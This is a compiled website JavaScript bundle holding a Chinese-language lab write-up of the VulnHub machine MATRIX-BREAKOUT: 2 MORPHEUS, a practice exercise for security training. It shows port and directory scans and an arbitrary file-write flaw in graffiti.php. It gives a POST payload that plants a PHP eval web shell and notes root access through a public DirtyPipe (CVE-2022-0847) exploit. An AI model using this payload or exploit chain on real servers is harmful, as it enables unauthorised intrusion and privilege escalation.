"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[6278],{41861:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>o,contentTitle:()=>r,default:()=>h,frontMatter:()=>s,metadata:()=>l,toc:()=>d});var i=t(74848),a=t(28453);const s={sidebar_position:5,tags:["Easy","Linux","LFI","\u4ee3\u7801\u6267\u884c","CVE"],title:"MATRIX-BREAKOUT: 2 MORPHEUS",sidebar_label:"MATRIX-BREAKOUT: 2 MORPHEUS"},r="MATRIX-BREAKOUT: 2 MORPHEUS",l={id:"box/VulnHub/MATRIX-BREAKOUT 2 MORPHEUS",title:"MATRIX-BREAKOUT: 2 MORPHEUS",description:"\u7aef\u53e3\u626b\u63cf",source:"@site/docs/box/VulnHub/MATRIX-BREAKOUT 2 MORPHEUS.md",sourceDirName:"box/VulnHub",slug:"/box/VulnHub/MATRIX-BREAKOUT 2 MORPHEUS",permalink:"/docs/box/VulnHub/MATRIX-BREAKOUT 2 MORPHEUS",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"LFI",permalink:"/docs/tags/lfi"},{label:"\u4ee3\u7801\u6267\u884c",permalink:"/docs/tags/\u4ee3\u7801\u6267\u884c"},{label:"CVE",permalink:"/docs/tags/cve"}],version:"current",sidebarPosition:5,frontMatter:{sidebar_position:5,tags:["Easy","Linux","LFI","\u4ee3\u7801\u6267\u884c","CVE"],title:"MATRIX-BREAKOUT: 2 MORPHEUS",sidebar_label:"MATRIX-BREAKOUT: 2 MORPHEUS"},sidebar:"boxSidebar",previous:{title:"Web Machine: (N7)",permalink:"/docs/box/VulnHub/Web Machine"},next:{title:"\u7384\u673a",permalink:"/docs/category/\u7384\u673a"}},o={},d=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data --&gt; root",id:"www-data----root",level:3},{value:"\u6269\u5c55",id:"\u6269\u5c55",level:2},{value:"docker",id:"docker",level:3}];function c(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h1,{id:"matrix-breakout-2-morpheus",children:"MATRIX-BREAKOUT: 2 MORPHEUS"}),"\n",(0,i.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"jtz@attacker:~$ nmap -sTCV -p- --min-rate 1000 192.168.1.8\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-12-16 15:39 CST\nNmap scan report for morpheus (192.168.1.8)\nHost is up (0.019s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)\n| ssh-hostkey: \n|_  256 aa83c351786170e5b7469f07c4ba31e4 (ECDSA)\n80/tcp open  http    Apache httpd 2.4.51 ((Debian))\n|_http-title: Morpheus:1\n|_http-server-header: Apache/2.4.51 (Debian)\n81/tcp open  http    nginx 1.18.0\n|_http-title: 401 Authorization Required\n| http-auth: \n| HTTP/1.1 401 Unauthorized\\x0D\n|_  Basic realm=Meeting Place\n|_http-server-header: nginx/1.18.0\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,i.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"jtz@attacker:~/CTF/VulhHub/MARRIX$ gobuster dir -u http://192.168.1.8/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,html,php===============================================================\nGobuster v3.5\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.1.8/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.5\n[+] Extensions:              txt,html,php\n[+] Timeout:                 10s\n===============================================================\n2023/12/16 16:29:54 Starting gobuster in directory enumeration mode\n===============================================================\n/index.html           (Status: 200) [Size: 348]\n/.html                (Status: 403) [Size: 276]\n/.php                 (Status: 403) [Size: 276]\n/javascript           (Status: 301) [Size: 315] [--\x3e http://192.168.1.8/javascript/]\n/robots.txt           (Status: 200) [Size: 47]\n/graffiti.php         (Status: 200) [Size: 459]\n/graffiti.txt         (Status: 200) [Size: 142]\n/.php                 (Status: 403) [Size: 276]\n/.html                (Status: 403) [Size: 276]\n/server-status        (Status: 403) [Size: 276]\nProgress: 881686 / 882244 (99.94%)\n===============================================================\n2023/12/16 16:35:47 Finished\n===============================================================\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u4e4b\u540e\u8bbf\u95ee\u5176\u4e2d\u7684 ",(0,i.jsx)(n.code,{children:"graffiti.php"})," \u8bf7\u6c42, \u53d1\u73b0\u5176\u53c2\u6570\u6bd4\u8f83\u7279\u6b8a, \u6839\u636e\u5176\u5185\u5bb9\u6211\u4eec\u77e5\u9053\u76ee\u6807\u662f\u9488\u5bf9 ",(0,i.jsx)(n.code,{children:"graffiti.txt"})," \u6587\u4ef6, \u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u5c1d\u8bd5\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\u7684\u5229\u7528"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524135026.png",alt:"20240524135026"})}),"\n",(0,i.jsx)(n.p,{children:"\u7ecf\u8fc7\u4e86\u4e00\u7cfb\u5217\u7684\u5c1d\u8bd5, \u6211\u53d1\u73b0\u5e76\u4e0d\u77e5\u9053\u76f4\u63a5\u53bb\u9605\u8bfb\u6587\u4ef6, \u8fd9\u4e2a\u770b\u8d77\u6765\u662f\u8bfb\u53d6\u6211\u4eec\u4f20\u5165\u7684\u5185\u5bb9\u5e76\u5c06\u5176\u5b58\u50a8\u5230 graffiti.txt \u6587\u4ef6\u4e2d, \u4e4b\u540e\u8bfb\u53d6 graffiti.txt \u6587\u4ef6\u5185\u5bb9\u663e\u793a\u51fa\u6765, \u53ef\u4ee5\u501f\u6b64\u6765\u5c1d\u8bd5 PHP \u4f2a\u534f\u8bae\u8fdb\u884c\u653b\u51fb"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524135042.png",alt:"20240524135042"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:'\n<?php\n$file="graffiti.txt";\nif($_SERVER[\'REQUEST_METHOD\'] == \'POST\') {\n    if (isset($_POST[\'file\'])) {\n       $file=$_POST[\'file\'];\n    }\n    if (isset($_POST[\'message\'])) {\n        $handle = fopen($file, \'a+\') or die(\'Cannot open file: \' . $file);\n        fwrite($handle, $_POST[\'message\']);\n\tfwrite($handle, "\\n");\n        fclose($file); \n    }\n}\n\n// Display file\n$handle = fopen($file,"r");\nwhile (!feof($handle)) {\n  echo fgets($handle);\n  echo "<br>\\n";\n}\nfclose($handle);\n?>\n<p>\nEnter message: \n<p>\n<form method="post">\n<label>Message</label><div><input type="text" name="message"></div>\n<input type="hidden" name="file" value="graffiti.txt">\n<div><button type="submit">Post</button></div>\n</form>\n'})}),"\n",(0,i.jsxs)(n.p,{children:["\u4e4b\u540e\u5c06\u5176\u89e3\u5bc6\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5bf9\u5e94\u7684\u52a0\u5bc6\u5185\u5bb9, \u4e4b\u540e\u6211\u4eec\u5ba1\u67e5\u6e90\u4ee3\u7801, \u6211\u53d1\u73b0\u8fd9\u662f\u4e00\u4e2a\u5148\u6307\u5b9a\u6587\u4ef6\u8ffd\u52a0\u5185\u5bb9\u7684\u529f\u80fd,\u6216\u8005\u8bfb\u53d6\u6307\u5b9a\u6587\u4ef6\u7684\u5185\u5bb9, \u501f\u6b64\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5411 ",(0,i.jsx)(n.code,{children:"graffiti.php"})," \u6587\u4ef6\u4e2d\u8ffd\u52a0\u4e00\u6bb5\u5185\u5bb9\u8fdb\u884c\u4ee3\u7801\u6267\u884c"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"message=<%3fphp+%40eval($_POST['cmd'])%3b+%3f>&file=graffiti.php\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524135119.png",alt:"20240524135119"})}),"\n",(0,i.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,i.jsx)(n.h3,{id:"www-data",children:"www-data"}),"\n",(0,i.jsxs)(n.p,{children:["\u4e4b\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u501f\u6b64\u6765\u83b7\u53d6\u4e00\u4e2a Shell\n",(0,i.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524135143.png",alt:"20240524135143"})]}),"\n",(0,i.jsx)(n.h3,{id:"www-data----root",children:"www-data --\x3e root"}),"\n",(0,i.jsxs)(n.p,{children:["\u4e4b\u540e\u4e0a\u4f20 Linpeas.sh \u811a\u672c\u8fdb\u884c\u6267\u884c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u5b58\u5728\u4e00\u4e2a CVE \u6f0f\u6d1e\n",(0,i.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524135203.png",alt:"20240524135203"}),"\n\u4e4b\u540e\u5728 Github \u641c\u7d22\u5230 ",(0,i.jsx)(n.a,{href:"https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits",children:"CVE-2022-0847"}),"\u8fdb\u884c\u5229\u7528\u6700\u7ec8\u83b7\u53d6\u5230\u4e86\u5bf9\u5e94\u7684 root \u6743\u9650\n",(0,i.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240524135250.png",alt:"20240524135250"})]}),"\n",(0,i.jsx)(n.h2,{id:"\u6269\u5c55",children:"\u6269\u5c55"}),"\n",(0,i.jsx)(n.h3,{id:"docker",children:"docker"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"www-data@morpheus:/tmp$ df\ndf\nFilesystem     1K-blocks    Used Available Use% Mounted on\n/dev/sda1        5042396 1958536   2843356  41% /\nudev              225352       0    225352   0% /dev\ntmpfs             241956       0    241956   0% /dev/shm\ntmpfs              48392     572     47820   2% /run\ntmpfs               5120       0      5120   0% /run/lock\n/dev/sda15        126678    6016    120662   5% /boot/efi\noverlay          5042396 1958536   2843356  41% /var/lib/docker/overlay2/d13e48a56e3ab95baad2c1aef075980aecbd25b19ae91ef7edac46c7a944c08d/merged\ntmpfs              48388       0     48388   0% /run/user/0\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u6267\u884c ",(0,i.jsx)(n.code,{children:"df"})," \u547d\u4ee4\u540e, \u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5176\u4e2d\u6709\u4e00\u4e2a docker \u7684\u76ee\u5f55, \u53ef\u60dc\u6ca1\u6709\u4ec0\u4e48\u7528"]})]})}function h(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(c,{...e})}):c(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>r,x:()=>l});var i=t(96540);const a={},s=i.createContext(a);function r(e){const n=i.useContext(s);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:r(e.components),i.createElement(s.Provider,{value:n},e.children)}}}]);